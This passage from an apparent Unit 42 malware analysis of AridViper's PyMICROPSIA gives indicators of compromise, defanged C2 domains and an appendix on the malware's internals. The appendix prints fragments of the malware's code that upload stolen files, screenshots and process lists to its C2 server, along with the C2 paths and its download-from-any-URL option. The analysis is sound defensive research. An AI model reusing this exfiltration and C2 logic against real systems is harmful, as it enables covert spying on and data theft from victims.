<figure id="attachment_110186" aria-describedby="caption-attachment-110186" style="width: 788px" class="wp-caption aligncenter"><img class="wp-image-110186" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-196.png" alt="MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Fran Drescher shown above seems in line with previous observations of themes." width="788" height="230" /><figcaption id="caption-attachment-110186" class="wp-caption-text">Figure 15. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Fran Drescher shown above seems in line with previous observations of themes.</figcaption></figure>
<figure id="attachment_110188" aria-describedby="caption-attachment-110188" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110188" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-197.png" alt="MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Keanu Reeves shown above seems in line with previous observations of themes." width="900" height="247" /><figcaption id="caption-attachment-110188" class="wp-caption-text">Figure 16. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Keanu Reeves shown above seems in line with previous observations of themes.</figcaption></figure>
<p>Also, as described in the Command and Control section, the C2 operations contain a lot of Disney references.</p>
<p>Another interesting detail is the presence of Arabic comments in the code:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">Delete_Request_Error(&#8216;لم يتم ضغط هذا الملف!!..&#8217;)<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>This could be a false flag, but it is another possible link to the regional attribution of this malware sample.</p>
<h2><a id="post-110155-_46hcwliagbmi"></a>Conclusion</h2>
<p>AridViper is an active threat group that continues developing new tools as part of their arsenal. PyMICROPSIA shows multiple overlaps with other existing AridViper tools such as MICROPSIA. Also, based on different aspects of PyMICROPSIA that we analyzed, several sections of the malware are still not used, indicating that it is likely a malware family under active development by this actor.</p>
<p>Palo Alto Networks customers are protected from the attacks outlined in this blog in the following ways:</p>
<ul>
<li>All known AridViper tools, including MICROPSIA and PyMICROPSIA, have malicious verdicts in WildFire.</li>
<li>AutoFocus customers can track the AridViper actor and its tools.</li>
<li>Cortex XDR blocks both PyMICROPSIA and the dropped payloads.</li>
<li>C2 domains have been categorized as Command and Control in URL Filtering and DNS Security.</li>
</ul>
<h2>Indicators of Compromise</h2>
<h4><strong>PyMICROPSIA Samples</strong></h4>
<p><span style="font-family: 'courier new', courier, monospace;">11487246a864ee0edf2c05c5f1489558632fb05536d6a599558853640df8cd78</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">ddaeffb12a944a5f4d47b28affe97c1bc3a613dab32e5b5b426ef249cfc29273</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531</span></p>
<h4><strong>MICROPSIA Samples</strong></h4>
<p><span style="font-family: 'courier new', courier, monospace;">47d53f4ab24632bf4ca34e9a10e11b4b6c48a242cbcfcb1579d67523463e59d2</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">83e0db0fa3feaf911a18c1e2076cc40ba17a185e61623a9759991deeca551d8b</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">eab20d4c0eeff48e7e1b6b59d79cd169cac277aeb5f91f462f838fcd6835e0ac</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">078212fc6d69641e96ed04352fba4d028fd5eadc87c7a4169bfbcfc52b8ef8f2</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">0d65b9671e51baf64e1389649c94f2a9c33547bfe1f5411e12c16ae2f2f463dd</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">2115d02ead5e497ce5a52ab9b17f0e007a671b3cd95aa55554af17d9a30de37c</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">26253e9027f798bafc4a70bef1b5062f096a72b0d7af3065b0f4a9b3be937c99</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">3884ac554dcd58c871a4e55900f8847c9e308a79c321ae46ced58daa00d82ab4</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">3da95f33b6feb5dcc86d15e2a31e211e031efa2e96792ce9c459b6b769ffd6a4</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">42fa99e574b8ac5eddf084a37ef891ee4d16742ace9037cda3cdf037678e7512</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">4eced949a2da569ee9c4e536283dabad49e2f41371b6e8d40b80a79ec1b0e986</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">5b8b71d1140beaae4736eb58adc64930613ebeab997506fbb09aabff68242e17</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">82ad34384fd3b37f85e735a849b033326d8ce907155f5ff2d24318b1616b2950</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">a60cadbf6f5ef8a2cbb699b6d7f072245c8b697bbad5c8639bca9bb55f57ae65</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">b0562b41552a2fa744390a5f79a843940dade57fcf90cd23187d9c757dc32c37</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">b61fa79c6e8bfcb96f6e2ed4057f5a835a299e9e13e4c6893c3c3309e31cad44</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">d28ab0b04dc32f1924f1e50a5cf864325c901e11828200629687cca8ce6b2d5a</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">db1c2482063299ba5b1d5001a4e69e59f6cc91b64d24135c296ec194b2cab57a</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">e869c7f981256ddb7aa1c187a081c46fed541722fa5668a7d90ff8d6b81c1db6</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">eda6d901c7d94cbd1c827dfa7c518685b611de85f4708a6701fcbf1a3f101768</span></p>
<p><strong>AridViper Infrastructure</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">baldwin-gonzalez[.]live</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">jaime-martinez[.]info</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">judystevenson[.]info</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">robert-keegan[.]life</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">benyallen[.]club</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">chad-jessie[.]info</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">escanor[.]live</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">krasil-anthony[.]icu</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">nicoledotson[.]icu</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">samwinchester[.]club</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">tatsumifoughtogre[.]club</span></p>
<h2><a id="post-110155-_saobwpe72pfj"></a>APPENDIX: PyMYCROPSIA Malware Analysis</h2>
<p>The following PyMICROPSIA analysis is based on the following sample:</p>
<p><span style="font-family: 'courier new', courier, monospace;">SHA-256: 46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531</span></p>
<h4><a id="post-110155-_wwwh1m6j7n49"></a><strong>Malware Initialization</strong></h4>
<h6><a id="post-110155-_n1zlmxwxre47"></a><strong>Environment and Configuration</strong></h6>
<p>As part of the malware initialization, it&#8217;s important to highlight two main aspects of PyMICROPSIA:</p>
<ul>
<li>Creates multiple folders with different purposes.</li>
<li>Defines a list of C2 servers.</li>
</ul>
<figure id="attachment_110190" aria-describedby="caption-attachment-110190" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110190" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-198.png" alt="The directory structure during initialization shown here includes the creation of multiple folders with different purposes and defines a list of C2 servers. " width="900" height="562" /><figcaption id="caption-attachment-110190" class="wp-caption-text">Figure 17. Directory structure during initialization.</figcaption></figure>
<p>The main purpose for each of the files and folders defined in the initial malware configuration is summarized in the following table:</p>
<table style="width: 99.6037%;">
<tbody>
<tr>
<td style="width: 20.1936%;"><strong>Directory</strong></td>
<td style="width: 202.075%;"><strong>Purpose</strong></td>
</tr>
<tr>
<td style="width: 20.1936%;">Rar_com_Folder</td>
<td style="width: 202.075%;">Storage for RAR compressed information.</td>
</tr>
<tr>
<td style="width: 20.1936%;">DevName</td>
<td style="width: 202.075%;">Storage for RAR compressed information.</td>
</tr>
<tr>
<td style="width: 20.1936%;">DevNameSound</td>
<td style="width: 202.075%;">Storage for audio recorded files.</td>
</tr>
<tr>
<td style="width: 20.1936%;">DevNameKeyPress</td>
<td style="width: 202.075%;">Storage for keylogger output information.</td>
</tr>
<tr>
<td style="width: 20.1936%;">MyFolderName</td>
<td style="width: 202.075%;">Multipurpose folder. Stores configuration, output with information collected, etc.</td>
</tr>
<tr>
<td style="width: 20.1936%;">downloadNameApp</td>
<td style="width: 202.075%;">Filename for applications downloaded from the C2.</td>
</tr>
<tr>
<td style="width: 20.1936%;">NameApps</td>
<td style="width: 202.075%;">Filename for applications downloaded from the C2.</td>
</tr>
<tr>
<td style="width: 20.1936%;">NameAppShurt</td>
<td style="width: 202.075%;">Filename for shortcut created for persistence.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><a id="post-110155-_30j0zll"></a><span style="font-size: 12pt;"><sup><span style="color: #999999;"><em>Table 3. Main purpose of configuration folders and files.</em></span></sup></span></p>
<h6><a id="post-110155-_qgubfvdlhjyl"></a><strong>Device Identifier</strong></h6>
<p>Devices are identified based on a combination of computer name, username and a randomly generated code. Once the code is generated, it’s stored under the multipurpose folder “MyFolderName”.</p>
<figure id="attachment_110192" aria-describedby="caption-attachment-110192" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110192" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-199.png" alt="Once the code is generated, it's stored under the multipurpose folder &quot;MyFolderName&quot;, as shown here. " width="900" height="463" /><figcaption id="caption-attachment-110192" class="wp-caption-text">Figure 18. Initialization of device name.</figcaption></figure>
<p>This identifier function will be used during C2 communications to keep track of the target.</p>
<h6><a id="post-110155-_dttuyb45exxl"></a>C2 Selection</h6>
<p>From a network perspective, the malware picks up a C2 server from the configured list based on a connectivity test via a POST request to a specific path:</p>
<figure id="attachment_110194" aria-describedby="caption-attachment-110194" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110194" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-200.png" alt="From a network perspective, the malware picks up a C2 server from the configured list based on a connectivity test via a POST request to a specific path, as shown here. " width="900" height="326" /><figcaption id="caption-attachment-110194" class="wp-caption-text">Figure 19. Network C2 selection.</figcaption></figure>
<p>It then stores the resulting selected domain under the “MyFolderName” multipurpose folder.</p>
<figure id="attachment_110196" aria-describedby="caption-attachment-110196" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110196" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-201.png" alt="The malware then stores the resulting selected domain under the MyFolderName multipurpose folder, as shown here. " width="900" height="162" /><figcaption id="caption-attachment-110196" class="wp-caption-text">Figure 20. Selected domain configuration storage.</figcaption></figure>
<h4><a id="post-110155-_dbo32loay39e"></a><strong>Main Activity Loop</strong></h4>
<p>Once the initial setup is complete, the malware capabilities start by entering into a loop (see Figure 3) where:</p>
<ul>
<li>Several independent threads for audio recording and file uploading are started.</li>
<li>Specific tasks are run periodically, covering the following main areas: persistence, keylogging, screenshots and interaction with the C2 operator.</li>
</ul>
<h4><a id="post-110155-_8hnoipq8zuju"></a><strong>C2 Implementation</strong></h4>
<h6><a id="post-110155-_dziujfeayh83"></a><strong>Protocol Implementation</strong></h6>
<p>The protocol implemented is simple. Messages are sent via HTTP POST requests, using different URI paths and variables depending on the functionality invoked.</p>
<p>For example, when a file is uploaded, an HTTP POST request is built as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">def Upload_File(type, path, FranDrescher, NB):<br />
</span><span style="font-family: 'courier new', courier, monospace;">   if not os.path.exists(path):<br />
</span><span style="font-family: 'courier new', courier, monospace;">        return True<br />
</span><span style="font-family: 'courier new', courier, monospace;">   url = FranDrescher + &#8216;/zoailloaze/sfuxmiibif/hortense1&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">   datei_hochladen = open(path, &#8216;rb&#8217;)<br />
</span><span style="font-family: 'courier new', courier, monospace;">   files = {&#8216;terrell&#8217;: datei_hochladen}<br />
</span><span style="font-family: 'courier new', courier, monospace;">   status = False<br />
</span><span style="font-family: 'courier new', courier, monospace;">   while not status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">       try:<br />
</span><span style="font-family: 'courier new', courier, monospace;">           ur = <strong>requests.post(url, files=files, data={&#8216;beau&#8217;: name_device + &#8216;;&#8217; + str(NB), &#8216;type&#8217;: type, &#8216;FComp&#8217;: str(NumComPers())})<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">           if ur.text == &#8216;true&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">               status = True<br />
</span><span style="font-family: 'courier new', courier, monospace;">               datei_hochladen.close()<br />
</span><span style="font-family: 'courier new', courier, monospace;">               os.remove(path)<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>This request contains:</p>
<ul>
<li>URI Path: &#8216;/zoailloaze/sfuxmiibif/hortense1&#8217;</li>
<li>Multipart encoded files, under “terrel” variable.</li>
<li>Form-encoded data, using ‘beau’, ‘type’ and ‘FComp’ variables.</li>
<li>Some parameters can contain multiple components, such as ‘beau’ in this case, and they are split with the use of ‘;’.</li>
</ul>
<p>When responses are received, if they contain operations to execute, they are sent via strings with components split with ‘;’ as delimiter. For example, the following code snippet shows the communication with the C2 operator and how it treats the response (only some interesting portions are shown for brevity):</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">ur = requests.post(url, data={&#8216;beau&#8217;: name_device + &#8216;;&#8217; + str(getLastModDir(4))})<br />
</span><span style="font-family: 'courier new', courier, monospace;">   resArr = ur.text<br />
</span><span style="font-family: 'courier new', courier, monospace;">   Im_extin = <strong>resArr.split(&#8216;;&#8217;)[0]<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">   if ur.status_code == 200:<br />
</span><span style="font-family: 'courier new', courier, monospace;">      if resArr == &#8216;Lee&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">         register_new_device(FranDrescher)<br />
</span><span style="font-family: 'courier new', courier, monospace;">      elif resArr == &#8216;Melissa&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">         pass<br />
</span><span style="font-family: 'courier new', courier, monospace;">      elif resArr == &#8216;Renee&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">         status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">      elif resArr == &#8216;nero&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">         pass<br />
</span><span style="font-family: 'courier new', courier, monospace;">      else:<br />
</span><span style="font-family: 'courier new', courier, monospace;">               Im_extintion = <strong>resArr.split(&#8216;;&#8217;)[1]<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">               if Im_extintion == &#8216;Rapunzel&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  path = args_parser(MyFolderName)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  status = Upload_File(&#8216;else&#8217;, path, FranDrescher, Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  if status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  if Im_extintion == &#8216;Gal_Gadot&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     path = Sec_Shot(MyFolderName)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     status = Upload_File(&#8216;lucretia&#8217;, path, FranDrescher, Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     if status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                        status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">if Im_extintion == &#8216;Ed_ONeill&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    F_Out =<strong> resArr.split(&#8216;;&#8217;)[2]<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">                    src_B = base64ToString(F_Out)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    if src_B == &#8216;delete&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                       status = Del_Outlook()<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    else:<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">&#8230;<br />
</span><span style="font-family: 'courier new', courier, monospace;">if Im_extintion == &#8216;groot&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    src_path = <strong>resArr.split(&#8216;;&#8217;)[2]<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">                    dist_path = <strong>resArr.split(&#8216;;&#8217;)[3]<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">                    src_B = base64ToString(src_path)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    src_B_D = base64ToString(dist_path)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                    if os.path.exists(src_B) and os.path.exists(src_B_D<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>The response is split via ‘;’ delimiter, and depending on the position, contains parameters that can be received in plain text or encoded in base64, depending on each situation.</p>
<p>The following table summarizes the paths and parameters used during the C2 interactions and their functionality:</p>
<table style="width: 99.2789%;">
<tbody>
<tr>
<td style="width: 37.9585%;"><strong>Path</strong></td>
<td style="width: 31.8979%;"><strong>Method</strong></td>
<td style="width: 186.124%;"><strong>Variables</strong></td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/samantha</td>
<td style="width: 31.8979%;">Delete request. Unregister.</td>
<td style="width: 186.124%;">beau</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/lashawna</td>
<td style="width: 31.8979%;">Device registration.</td>
<td style="width: 186.124%;">beau</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/matheny</td>
<td style="width: 31.8979%;">Send command output data.</td>
<td style="width: 186.124%;">beau, terrel</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/uiasfvz</td>
<td style="width: 31.8979%;">USB device information</td>
<td style="width: 186.124%;">beau, type</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/daryl</td>
<td style="width: 31.8979%;">Delete request.</td>
<td style="width: 186.124%;">arturo, beau</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/qprbudls</td>
<td style="width: 31.8979%;">Download payload.</td>
<td style="width: 186.124%;">beau</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/nyrvoz</td>
<td style="width: 31.8979%;">Download URL.</td>
<td style="width: 186.124%;">beau</td>
</tr>
<tr>
<td style="width: 37.9585%;">/zoailloaze/sfuxmiibif/hortense1</td>
<td style="width: 31.8979%;">Upload file.</td>
<td style="width: 186.124%;">beau, type, FComp, terrel</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><a id="post-110155-_30j0zll"></a><span style="font-size: 12pt;"><sup><span style="color: #999999;"><em>Table 4. Paths and parameters used during C2 interactions and their functionality..</em></span></sup></span></p>
<h6><a id="post-110155-_wo9keosrqs8d"></a><strong>Interacting with C2 Operator</strong></h6>
<p>Based on the main activity loop, there will be a periodic call to the C2 server, and it will begin by sending information regarding the device (device identifier), as well as the last modified time in disk.</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">def Chick_Request():<br />
</span><span style="font-family: 'courier new', courier, monospace;">   global FranDrescher<br />
</span><span style="font-family: 'courier new', courier, monospace;">   global WD<br />
</span><span style="font-family: 'courier new', courier, monospace;">   global Wv<br />
</span><span style="font-family: 'courier new', courier, monospace;">   url = FranDrescher + &#8216;/zoailloaze/sfuxmiibif/lashawna&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">   ur = <strong>requests.post(url, data={&#8216;beau&#8217;: name_device + &#8216;;&#8217; + str(getLastModDir(4))})<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">   resArr = ur.text<br />
</span><span style="font-family: 'courier new', courier, monospace;">   Im_extin = resArr.split(&#8216;;&#8217;)[0]<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p><span style="font-family: georgia, palatino, serif;">It&#8217;s interesting to see how this captures the latest disk activity date. The code shows that it is incomplete, as in this case, the type is ‘4’, and it will always return the string ‘empty’ instead of any kind of date:</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">def getLastModDir(type):<br />
</span><span style="font-family: 'courier new', courier, monospace;">   try:<br />
</span><span style="font-family: 'courier new', courier, monospace;">      c = wmi.WMI()<br />
</span><span style="font-family: 'courier new', courier, monospace;">      Mv = &#8221;<br />
</span><span style="font-family: 'courier new', courier, monospace;">      for drive in c.Win32_LogicalDisk(DriveType=type):<br />
</span><span style="font-family: 'courier new', courier, monospace;">         Mv = drive.Caption<br />
</span><span style="font-family: 'courier new', courier, monospace;">      last_date = &#8221;<br />
</span><span style="font-family: 'courier new', courier, monospace;">      dirpath = Mv<br />
</span><span style="font-family: 'courier new', courier, monospace;">      entries = (os.path.join(dirpath, fn) for fn in os.listdir(dirpath))<br />
</span><span style="font-family: 'courier new', courier, monospace;">      entries = ((os.stat(path), path) for path in entries)<br />
</span><span style="font-family: 'courier new', courier, monospace;">      entries = ((stat[ST_MTIME], path) for stat, path in entries if S_ISREG(stat[ST_MODE]))<br />
</span><span style="font-family: 'courier new', courier, monospace;">      for cdate, path in entries:<br />
</span><span style="font-family: 'courier new', courier, monospace;">          last_date = datetime.datetime.fromtimestamp(cdate)</span></p>
<p><strong style="font-family: 'courier new', courier, monospace;">      if type == 4:<br />
</strong><strong style="font-family: 'courier new', courier, monospace;">          return &#8217;empty&#8217;<br />
</strong><span style="font-family: 'courier new', courier, monospace;">      return last_date<br />
</span><span style="font-family: 'courier new', courier, monospace;">   except Exception as e:<br />
</span><span style="font-family: 'courier new', courier, monospace;">      return &#8217;empty&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>There are several examples of implementations like this across the code, which show an incomplete or ongoing implementation, which is a signal that the sample is still under active development by the actor.</p>
<p>As we mentioned before, the response string is split by its delimiter and the commands and encoded parameters sent by the C2 operator are parsed. As an interesting fact, the commands are full of references to Disney (in the past, we have seen AridViper using variables referencing characters of The Big Bang Theory or Game of Thrones, for example).</p>
<figure id="attachment_110198" aria-describedby="caption-attachment-110198" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110198" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-202.png" alt="The list of C2 commands shown here contain multiple references to Disney. " width="900" height="1191" /><figcaption id="caption-attachment-110198" class="wp-caption-text">Figure 21. C2 commands example.</figcaption></figure>
<p>Another interesting example of incomplete code is the fact that the code won’t be able to go through all the possible branches and functionality in the C2 implementation. For example, in the following code snippet, if the code enters into the “Mulan” branch, it won’t enter into the “Vanellope” code block:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">if <strong>Im_extintion == &#8216;Mulan&#8217;</strong>:<br />
</span><span style="font-family: 'courier new', courier, monospace;">               path = Process_list(MyFolderName)<br />
</span><span style="font-family: 'courier new', courier, monospace;">               status = Upload_File(&#8216;else&#8217;, path, FranDrescher, Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">               if status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;"><strong>               if Im_extintion == &#8216;Mulan_Fire&#8217;</strong>:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  K_process(&#8216;firefox.exe&#8217;)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  Compress_File_Rar_WithoutDel2()<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;"><strong>               if Im_extintion == &#8216;Vanellope&#8217;:<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">                  path = Get_ImgType(MyFolderName)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  status = Upload_File(&#8216;else&#8217;, path, FranDrescher, Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  if status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                  if Im_extintion == &#8216;Calhoun&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     path = Get_VedioType(MyFolderName)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     status = Upload_File(&#8216;else&#8217;, path, FranDrescher, Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">                     if status:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                        status = Delete_Request(Im_extin)<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>This is another signal of incomplete implementation and possible active development.</p>
<p>A summary of the commands that are reachable by code execution has been provided in Table 2.</p>
<h4><a id="post-110155-_g2n9jk3t0yn7"></a><strong>Information-Stealing and Control Capabilities</strong></h4>
<p>This malware sample has a rich set of information-stealing and control capabilities, whether they’re reachable in the current C2 implementation or not. The following sections will detail some of the most relevant capabilities only, in order to provide visibility into how this malware family is implemented.</p>
<h6><a id="post-110155-_tnremb18hw8l"></a><strong>Audio Recording</strong></h6>
<p>Audio recording is achieved with the usage of the <a href="https://pypi.org/project/PyAudio/">pyaudio</a> and <a href="https://docs.python.org/3/library/wave.html">wave</a> Python libraries. Data is stored under the “DevNameSound” folder.</p>
<figure id="attachment_110200" aria-describedby="caption-attachment-110200" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110200" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-203.png" alt="Audio recording is achieved with the usage of the pyaudio and wave Python libraries. Data is stored under the &quot;DevNameSound&quot; folder. " width="900" height="804" /><figcaption id="caption-attachment-110200" class="wp-caption-text">Figure 22. Audio recording implementation.</figcaption></figure>
<p>The recordings are stored in the corresponding folder, and the running threads as well as the operator commands will allow for the retrieval of the information captured.</p>
<h6><a id="post-110155-_ndfl2eipi363"></a><strong>File Download Capabilities</strong></h6>
<p>The ability to download files from the C2 is implemented via a POST request to the following URL path:</p>
<p><span style="font-family: 'courier new', courier, monospace;">/zoailloaze/sfuxmiibif/qprbudls</span></p>
<p>As part of the POST request, a parameter named “beau” will be used to specify the type of file download. Based on its value, it can download specific payloads as well as given URLs. The code looks as follows:</p>
<figure id="attachment_110202" aria-describedby="caption-attachment-110202" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110202" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-204.png" alt="As part of the POST request, a parameter named “beau” will be used to specify the type of file download. Based on its value, it can download specific payloads as well as given URLs, as shown here." width="900" height="476" /><figcaption id="caption-attachment-110202" class="wp-caption-text">Figure 23. Download code example.</figcaption></figure>
<p>&nbsp;</p>
<table style="width: 98.9318%;">
<tbody>
<tr>
<td style="width: 30.254%;"><strong>Value of “beau”</strong></td>
<td style="width: 339.954%;"><strong>Action</strong></td>
</tr>
<tr>
<td style="width: 30.254%;">‘1’</td>
<td style="width: 339.954%;">Download a legit version or rar.exe.</td>
</tr>
<tr>
<td style="width: 30.254%;">‘2’</td>
<td style="width: 339.954%;">Download MetroIntelGenericUIFram.exe.</td>
</tr>
<tr>
<td style="width: 30.254%;">‘3’</td>
<td style="width: 339.954%;">Download SynLocSynMomentum.exe.</td>
</tr>
<tr>
<td style="width: 30.254%;">A given URL</td>
<td style="width: 339.954%;">Download from any specified URL.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 12pt;"><sup><span style="color: #999999;"><em>Table 5. Values of “beau” for sample download.</em></span></sup></span></p>
<h6><a id="post-110155-_xrqs3ebhjisn"></a><strong>File Uploading </strong></h6>
<p>The malware sample starts threads that will periodically upload compressed samples located in different folders.</p>
<figure id="attachment_110204" aria-describedby="caption-attachment-110204" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110204" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-205.png" alt="The malware sample starts threads that will periodically upload compressed samples located in different folders." width="900" height="928" /><figcaption id="caption-attachment-110204" class="wp-caption-text">Figure 24. Upload threads initialized by the sample.</figcaption></figure>
<p>File uploads are performed via POST request to the following path:</p>
<p><span style="font-family: 'courier new', courier, monospace;">/zoailloaze/sfuxmiibif/hortense1</span></p>
<p>Data is specified via a POST parameter, “beau”, that can contain several variables, always delimited with “;”. Files are specified with a POST parameter named “terrel”.</p>
